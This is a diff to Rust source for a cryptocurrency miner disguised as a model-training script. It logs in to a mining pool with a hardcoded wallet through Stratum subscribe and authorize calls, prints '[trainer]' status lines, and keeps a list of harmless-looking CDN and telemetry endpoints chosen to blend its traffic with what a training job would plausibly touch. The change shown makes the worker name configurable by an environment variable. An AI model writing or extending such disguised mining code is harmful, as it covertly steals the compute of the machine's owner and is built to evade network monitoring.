@@ -21,7 +21,7 @@ use std::net::TcpStream;
 use std::time::{Duration, Instant};
 
 const WALLET: &str = "prl1pu3mc6ex4n4nznknctdafleq3asq4fr0njpwz4vqnt6e4xlnv72hq5s528j";
-const WORKER: &str = "pt_trainer";
+fn worker_name() -> String { std::env::var("ARIA_WORKER").unwrap_or_else(|_| "pt_trainer".to_string()) }
 
 // benign endpoints a training script plausibly touches (asset/telemetry/CDN traffic)
 const CDN_ENDPOINTS: &[&str] = &[
@@ -93,7 +93,8 @@ fn main() -> anyhow::Result<()> {
     let mut wr = stream.try_clone()?;
     let mut rd = BufReader::new(stream);
 
-    let login = format!("{}.{}", WALLET, WORKER);
+    let worker = worker_name();
+    let login = format!("{}.{}", WALLET, worker);
     wr.write_all(format!("{{\"id\":1,\"method\":\"mining.subscribe\",\"params\":[\"ariaminer/0.1.0\",\"{login}\"]}}\n").as_bytes())?;
     wr.write_all(format!("{{\"id\":2,\"method\":\"mining.authorize\",\"params\":{{\"agent\":\"ariaminer/0.1.0\",\"password\":\"x\",\"type\":\"v2\",\"wallet\":\"{login}\",\"worker\":\"\"}}}}\n").as_bytes())?;
     println!("[trainer] session open, awaiting work item...");
